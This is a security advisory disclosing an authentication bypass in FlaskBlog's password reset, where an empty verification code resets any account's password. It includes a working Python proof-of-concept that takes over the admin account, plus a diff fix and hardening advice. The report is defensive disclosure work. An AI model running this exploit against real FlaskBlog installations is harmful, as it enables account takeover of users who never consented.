# Vulnerability Report

## Summary
- **Title**: Authentication Bypass in Password Reset Mechanism in FlaskBlog
- **Affected Version**: <= 3.0.0dev (latest as of 2026-06-28)
- **CWE**: CWE-287 - Improper Authentication
- **CVSS 3.1 Score**: 9.1 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **Vendor**: DogukanUrker
- **Product**: FlaskBlog
- **Repository**: https://github.com/DogukanUrker/FlaskBlog

## Description

A critical authentication bypass vulnerability exists in FlaskBlog's password reset functionality. The vulnerability allows an unauthenticated attacker to reset any user's password without a valid verification code, leading to full account takeover.

The root cause is a logic flaw in `app/routes/password_reset.py`. The password reset verification code check uses `password_reset_codes_storage.get(username, "")` which returns an empty string `""` as the default value when no reset code has been requested for a user. Because:

1. The WTForms form validation (`form.validate()`) is never called in the code verification path, meaning the `InputRequired()` and `Length(min=4, max=4)` validators on the `code` field are never enforced.
2. An attacker can submit an empty string as the verification code.
3. The comparison `"" == ""` evaluates to `True`, bypassing the authentication check entirely.

This allows any unauthenticated attacker who knows a victim's username (usernames are publicly visible via the search feature and user profile pages) to reset their password and take over their account.

Additionally, even when a legitimate reset code has been generated, the code is only 4 digits (1000-9999, yielding 9000 possible values), generated using the non-cryptographic `random.randint()` function, with no rate limiting or expiration mechanism, making it trivially brute-forceable.

## Affected Component
- File: `app/routes/password_reset.py`
- Function: `password_reset()`
- Line: 55 (code comparison), 45 (form created but never validated)

## Proof of Concept

### Environment
- OS: Any
- FlaskBlog Version: 3.0.0dev (latest commit)
- Python: 3.10+

### Steps to Reproduce

1. Ensure FlaskBlog is running with at least one registered user (e.g., the default `admin` user).
2. The target user must NOT have an active pending password reset code (this is the default state for all users, or after a server restart).
3. Run the following PoC script, which resets the target user's password without any verification code:

### PoC Code

```python
#!/usr/bin/env python3
"""
PoC: FlaskBlog Password Reset Authentication Bypass
CVE: Pending
This PoC is for authorized security testing only.
"""

import requests
from bs4 import BeautifulSoup

TARGET_URL = "http://localhost:1283"
VICTIM_USERNAME = "admin"
NEW_PASSWORD = "Pwned12345"

def exploit(target_url, victim_username, new_password):
    session = requests.Session()
    
    # Step 1: Get CSRF token from the password reset page
    resp = session.get(f"{target_url}/password-reset/codesent=true")
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf_token"})
    if not csrf_token:
        print("[-] Could not find CSRF token")
        return False
    csrf_token = csrf_token["value"]
    print(f"[+] Got CSRF token: {csrf_token[:20]}...")
    
    # Step 2: Submit password reset with empty code
    data = {
        "csrf_token": csrf_token,
        "username": victim_username,
        "code": "",           # Empty code matches default dict value ""
        "password": new_password,
        "password_confirm": new_password,
    }
    
    resp = session.post(
        f"{target_url}/password-reset/codesent=true",
        data=data,
    )
    
    # Step 3: Verify by logging in with the new password
    resp = session.get(f"{target_url}/login/redirect=&")
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf_token"})["value"]
    
    resp = session.post(
        f"{target_url}/login/redirect=&",
        data={
            "csrf_token": csrf_token,
            "username": victim_username,
            "password": new_password,
        },
    )
    
    if resp.status_code == 302 or victim_username.lower() in resp.text.lower():
        print(f"[+] SUCCESS: Password for '{victim_username}' reset to '{new_password}'")
        print(f"[+] Account takeover complete!")
        return True
    else:
        print("[-] Exploit may have failed. Check manually.")
        return False

if __name__ == "__main__":
    exploit(TARGET_URL, VICTIM_USERNAME, NEW_PASSWORD)
```

## Impact

An unauthenticated attacker can take over any user account (including admin accounts) by:
1. Visiting the public search page to find valid usernames
2. Submitting an empty verification code to the password reset endpoint
3. Setting a new password of their choice

This grants the attacker full access to the victim's account, including:
- Reading and modifying all posts
- Accessing admin panel (if the victim is an admin)
- Deleting other users' content
- Modifying account settings

## Suggested Fix

```diff
--- a/app/routes/password_reset.py
+++ b/app/routes/password_reset.py
@@ -44,13 +44,17 @@
     form = PasswordResetForm(request.form)
 
     if code_sent == "true":
         if request.method == "POST":
-            username = request.form["username"]
-            username = username.replace(" ", "")
-            code = request.form["code"]
-            password = request.form["password"]
-            password_confirm = request.form["password_confirm"]
-
-            if code == password_reset_codes_storage.get(username, ""):
+            if not form.validate():
+                flash_message(
+                    page="password_reset",
+                    message="invalid_credentials",
+                    category="error",
+                    language=session.get("language", "en"),
+                )
+            else:
+                username = form.username.data.replace(" ", "")
+                code = form.code.data
+                password = form.password.data
+                password_confirm = form.password_confirm.data
+
+                stored_code = password_reset_codes_storage.get(username)
+                if stored_code is not None and code == stored_code:
```

Key fixes:
1. Call `form.validate()` to enforce `InputRequired()` and `Length(min=4)` validators
2. Use `password_reset_codes_storage.get(username)` without a default value (returns `None` if not found)
3. Check `stored_code is not None` before comparing, ensuring a reset code was actually requested

Additional recommended improvements:
- Use `secrets.token_urlsafe(32)` instead of `randint(1000, 9999)` for reset codes
- Add rate limiting to the password reset verification endpoint
- Add code expiration (e.g., 15 minutes)
- Use `hmac.compare_digest()` for timing-safe comparison

## References
- CWE-287: Improper Authentication - https://cwe.mitre.org/data/definitions/287.html
- CWE-330: Use of Insufficiently Random Values - https://cwe.mitre.org/data/definitions/330.html
- OWASP Forgot Password Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html

## Credit
- Discovered by: goutou (https://github.com/goutouanquan)
- Contact: goutouanquan@163.com

## Timeline
- 2026-06-28: Vulnerability discovered
- 2026-06-28: Report drafted
